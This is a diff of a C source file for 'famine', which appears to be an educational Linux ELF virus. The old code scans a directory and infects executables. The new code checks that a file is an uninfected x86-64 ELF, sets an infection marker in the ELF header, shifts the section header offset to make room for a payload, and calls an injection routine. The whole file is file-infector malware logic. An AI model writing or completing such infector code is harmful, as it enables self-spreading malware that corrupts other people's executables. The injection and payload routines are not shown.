@@ -1,72 +1,76 @@
 #include <famine.h>
 
 ////////////////////////////////////////////////////////////////////////////////
-/// STATIC FUNCTION
+/// STATIC FUNCTIONS
 ////////////////////////////////////////////////////////////////////////////////
 
-static inline bool is_infectable(const char *filename, const unsigned char type)
+static inline Elf64_Ehdr *get_header(struct s_info *info)
 {
-	struct stat statbuf;
+	Elf64_Ehdr *header;
+	
+	header = (Elf64_Ehdr *)info->ptr;
 
-	if (type != FILE_TYPE)
-		return false;
-	if (_strcmp(filename, "./famine") == 0)
-		return false;
+	if (info->ptr + sizeof(Elf64_Ehdr) >= info->ptr + info->size)
+		exit(0);
 
-	if (_stat(filename, &statbuf) < 0)
-	{
-		ERR(filename);
-		return false;
-	}
-
-	return statbuf.st_mode & S_IXUSR;
+	return header;
 }
 
-static inline void update_directory(struct directory *dir, const char *filename)
+static inline bool is_elf(const Elf64_Ehdr *header)
 {
-	const int limit = _strlen(filename);
-
-	_bzero(dir->buf, _strlen(dir->buf));
-
-	for (int index = 0; index < dir->size; index++)
-		dir->buf[index] = dir->path[index];
-	for (int index = 0; index < limit; index++)
-		dir->buf[dir->size + index] = filename[index];
+	return *(unsigned int *)header == ELF_MAGIC_NUMBER;
 }
+
+static inline bool is_x86(const Elf64_Ehdr *header)
+{
+	return header->e_ident[EI_CLASS] == X86_64;
+}
+
+static inline bool is_linked(const Elf64_Ehdr *header)
+{
+	return header->e_entry != 0;
+}
+
+static inline bool is_not_infected(const Elf64_Ehdr *header)
+{
+	return *(uint32_t *)((char *)&header->e_ident[EI_PAD]) != INFECTED_MAGIC_NUMBER;
+}
+
 
 ////////////////////////////////////////////////////////////////////////////////
 /// PUBLIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
 
-void famine(struct directory *dir)
+void famine(const char *file, const size_t m_entry)
 {
-	int fd = 0;
-	int index = 0;
-	int limit = 0;
-	char buf[BUFF_SIZE];
-	struct linux_dirent64 *dirp;
+	FUNC;
+	printf("%s\n\n", file);
 
-	if ((fd = _open(dir->path, O_RDONLY | O_DIRECTORY, 0000)) < 0)
+	struct s_info info = get_info(file);
+	Elf64_Ehdr *header = get_header(&info);
+	const struct criteria crit[] =
 	{
-		ERR("open");
-		return ;
-	}
+		(const struct criteria){&is_elf},
+		(const struct criteria){&is_x86},
+		(const struct criteria){&is_linked},
+		(const struct criteria){&is_not_infected},
+	};
 	
-	while ((limit = _getdents64(fd, (struct linux_dirent64 *)buf, BUFF_SIZE)) > 0)
+	for (unsigned char index = 0; index < CRITERIA_SIZE; index++)
 	{
-		while (index < limit)
+		if (crit[index].fct(header) == false)
 		{
-			dirp = (struct linux_dirent64 *)(buf + index);
-
-			update_directory(dir, dirp->d_name);
-			LOG(dir->buf);
-
-			if (is_infectable(dir->buf, dirp->d_type) == true)
-				infect_file(dir->buf);
-
-			index += dirp->d_reclen;
+			ERR;
+			exit(0);
 		}
 	}
 
-	_close(fd);
+	modify_segment(&info);
+
+	*(uint32_t *)&header->e_ident[EI_PAD] = INFECTED_MAGIC_NUMBER;
+	header->e_shoff += info.offs_padding + PAYLOAD_SIZE;
+
+	inject(&info, m_entry);
+
+	release_info(&info);
 }
